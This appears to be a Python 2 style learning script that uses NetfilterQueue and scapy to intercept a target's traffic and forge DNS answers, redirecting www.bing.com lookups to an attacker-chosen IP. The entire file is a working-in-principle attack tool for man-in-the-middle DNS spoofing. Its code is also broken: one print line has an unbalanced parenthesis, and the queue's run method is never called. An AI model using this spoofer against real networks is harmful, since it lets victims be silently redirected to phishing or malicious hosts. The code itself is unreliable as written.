#!/usr/bin/python

'''
Unable to instal NetfilterQueue: pip install NetfilterQueue
CMD -- ping -c 1 www.bing.com
Run the CMD before and after running net_cut.py, and have the target machine access the site in question.
Notice the IP Addres has been changed/redirected.
'''

import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
	#print(packet)
	#print(packet.get_payload())	
	
	scapy_packet = scapy.IP(packet.get_payload())
	
	# Check if reponse has a DNS request.
	if scapy_packet.haslayer(scapy.DNSRR):
		
		qname = scapy_packet[scapy.DNSQR].qname
		print(scapy_packet.show()))
		
		# Use Scapy to Create a DNS response to redirect IP, if the target request bing.com
		if "www.bing.com" in qname:
			print("[+] Spoofing target")
			answer = scapy.DNSRR(rrname=qname, rdata="XX.X.X.XX")
			scapy_packet[scapy.DNS].an = answer
			scapy_packet[scapy.DNS].ancount = 1
			
			# Need to modify scapy packet fields. Need to be done to redirect correctly
			del scapy_packet[scapy.IP].len
			del scapy_packet[scapy.IP].chksum
			del scapy_packet[scapy.UDP].chksum
			del scapy_packet[scapy.UDP].len
			
			# Converted packet to manipulate, cast back to str() and then set packet.		
			packet.set_payload(str(scapy_packet))

	# Can either drop packets or accept and forward allowing them to reach target.
	# packet.drop()
	packet.accept()

	

''' 
Create an object instance of the NetfileterQueue() Class
Bind object w/ queue created when executed on the CMD line "iptables -I..."
And call the callback function, process_packet."
'''
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run


